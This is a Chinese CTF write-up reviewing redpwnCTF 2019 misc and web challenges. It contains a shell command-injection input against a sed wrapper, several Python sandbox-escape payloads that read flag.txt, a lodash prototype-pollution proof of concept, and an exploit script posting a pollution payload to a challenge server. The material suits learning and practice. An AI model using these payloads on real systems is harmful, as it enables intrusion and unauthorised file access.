---
title: 'redpwnctf复盘'
date: 2019-08-19
updated: 2019-08-20
category: 'ctf'
tags:
  - 'MISC'
  - 'web'
  - 'redpwn'
lang: 'zh'
draft: false
---
## MISC

### he sed shi sed

一道很有意思的题目，看了一下源码如下：

```python
from os import system
inp = input("What you thought you sed\n")
rep = '/' + input("What you aren't sure you sed\n") +  '/' 
new = input("What you actually sed\n")
cmd = 's' + rep + new + "/g"
if "'" not in new:
	cmd += "'"
print("You actually said")

system("echo '" + inp + "' | sed '" +  cmd)
```

sed命令是一种文本处理的命令， `sed s/a/b/g` 就是替换

如果我们输入：  

```
What you thought you sed
abcdef
What you aren't sure you sed
b
What you actually sed
c
You actually said
accdef
```

可以据此猜测出就是将b替换成了c

于是猜测命令如下： `echo $1 | sed 's/$2/$3/g'`

注意到这两种命令的区别  
![](https://i.loli.net/2019/08/19/cdaOznu5NMPTD4p.png)

于是输入`$(ls)`

得到的结果如下：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed0.png)

然后尝试输入`'$(ls)'`

这个时候就得到结果了，实现了命令注入

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed1.png)

### genericpyjail

![](https://i.loli.net/2019/08/19/iw71jLN54Fvr6KY.png)

题目给了一个黑名单，并且提示你黑名单是不安全的，也就是要绕过了。

![](https://i.loli.net/2019/08/19/SEOXJqPplGFi4U5.png)

很多都被禁止了，那么如何才能够绕过这些限制来达到任意命令执行呢

这里可以使用unicode编码来绕过限制hhh（没想到吧

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail0.png)

或者这样也行：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail1.png)

payload:

```
'\u0066\u003d\u006f\u0070\u0065\u006e\u0028\u0022\u0066\u006c\u0061\u0067\u002e\u0074\u0078\u0074\u0022\u002c\u0020\u0022\u0072\u0022\u0029'.decode('unicode-escape')
'\u0070\u0072\u0069\u006e\u0074\u0028\u0066\u002e\u0072\u0065\u0061\u0064\u0028\u0029\u0029'.decode('unicode-escape')

or--

exit(getattr(locals().get(chr(95)*2+'built'+'ins'+chr(95)*2), 'op'+'en')('fl'+'ag.txt').read())
```

留下一个问题，怎么将字符转为Unicode编码。。

### Tux Trivia Show

一个师傅的exp

```python

from pwn import *
from subprocess import check_output

p = remote("chall.2019.redpwn.net", 6001)

p.recvuntil("!!!")

while True:
    try:
        print(p.recv())
        s = p.recvuntil('?')
    except EOFError:
        s = p.recv()
        print(s)
    print(s)
    s = s[:-1]
    s = s.split('capital of ')[1]
    # print(s)
    ans = check_output(['python3', 'get_capital.py', s])
    print(ans) 
    p.sendline(ans)

p.interactive()
```

`get_capital.py`如下：

```python
from countryinfo import CountryInfo
import sys

country = sys.argv[1]
country_obj = CountryInfo(country)

caps = {'New Mexico': 'Santa Fe', 'Colorado': 'Denver', 'Vermont': 'Montpelier', 'Arizona': 'Phoenix', 'Iowa': 'Des Moines', 'Florida': 'Tallahassee', 'West Virginia': 'Charleston', 'Illinois': 'Springfield', 'Oregon': 'Salem', 'Kansas': 'Topeka', 'Arkansas': 'Little Rock', 'Kentucky': 'Frankfort', 'Massachusetts': 'Boston', 'Texas': 'Austin', 'Wyoming': 'Cheyenne', 'Maryland': 'Annapolis', 'New York': 'Albany', 'New Jersey': 'Trenton', 'Louisiana': 'Baton Rouge', 'South Carolina': 'Columbia', 'Georgia': 'Atlanta', 'Idaho': 'Boise', 'Alaska': 'Juneau', 'Oklahoma': 'Oklahoma City', 'Connecticut': 'Hartford', 'Nebraska': 'Lincoln', 'Tennessee': 'Nashville', 'Pennsylvania': 'Harrisburg', 'Michigan': 'Lansing', 'Maine': 'Augusta', 'Wisconsin': 'Madison', 'South Dakota': 'Pierre', 'California': 'Sacramento', 'New Hampshire': 'Concord', 'Indiana': 'Indianapolis', 'Washington': 'Olympia', 'Utah': 'Salt Lake City', 'Alabama': 'Montgomery', 'Minnesota': 'St. Paul', 'Hawaii': 'Honolulu', 'Ohio': 'Columbus', 'Missouri': 'Jefferson City', 'Delaware': 'Dover', 'Virginia': 'Richmond', 'Nevada': 'Carson City', 'Montana': 'Helena', 'North Dakota': 'Bismarck', 'Mississippi': 'Jackson', 'North Carolina': 'Raleigh', 'Rhode Island': 'Providence', 'Bahamas': 'Nassau', 'Andorra': 'Andorra la Vella', 'East Timor (Timor-Leste)': 'Dili', 'Serbia': 'Belgrade', 'Macedonia': 'Skopje', 'Gambia': 'Banjul'}

# with open('usstates.csv', 'r') as f:
#     for l in f:
#         l = l.strip()
#         state, cap = l.split(',')
#         caps[state] = cap

try:
    if country == 'Georgia':
        print(caps['Georgia'])
    elif country == 'San Marino':
        print('San Marino')
    elif country == 'Kiribati':
        print('Tarawa')
    elif country == 'Moldova':
        print('Chisinau')
    else:
        print(country_obj.capital())
except KeyError:
    print(caps[country])
```

### genericpyjail2

还是一道python沙盒逃逸的题目

源码  

```python
gone = ['open','file','execfile','compile','reload','__import__','eval','input']
for func in gone:
    del __builtins__.__dict__[func]
print 'wow! again, there\'s a file called flag.txt! insane!'
while True:
    try:
      x = raw_input()      
      if " " in x:
       print "no spaces!"
       exit()    
      print "now it's ", x, "!"
      exec 'x=' + x
    except Exception, e:
      print 'Exception: ', e
```

给出的payload如下

`raw_input((42).__class__.__base__.__subclasses__()[40]('flag.txt').read())`

## web

### blueprint

题目给出了源码

但是这对于不懂JavaScript的我来说又有什么用呢。

天真的以为是XSS，于是抓包fuzz了一波，但是没有任何结果：

![fuzz](https://i.loli.net/2019/08/19/ObmNvATC9y2qPtD.png)

之后得知这是JavaScript原型污染，具体什么是JavaScript的原型污染之后再说

可以参考[这篇](https://snyk.io/vuln/SNYK-JS-LODASH-450202)，lodash这个库存在原型链污染

poc如下

```python
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"a0": true}}}'

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();
```

原体中存在漏洞的代码；

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue1.png)

exp  

```python
import requests

user_id = '22b0d010672600233e4ea68da64b1750'
url = "http://39.106.125.244:8001/"

r = requests.post(url, cookies={"user_id":user_id}, json={"content":"yakuhito was here","public":true, "constructor": {"prototype": {"public": true}}})

print(r.text)
```

然后就可以看到flag了

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue0.png)

关于JavaScript原型链污染的文章可以看[p牛的](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

## 参考

[Redpwn CTF 2019 – Writeup](https://kuhi.to/2019/08/15/redpwn-ctf-2019-writeup/#web-2)
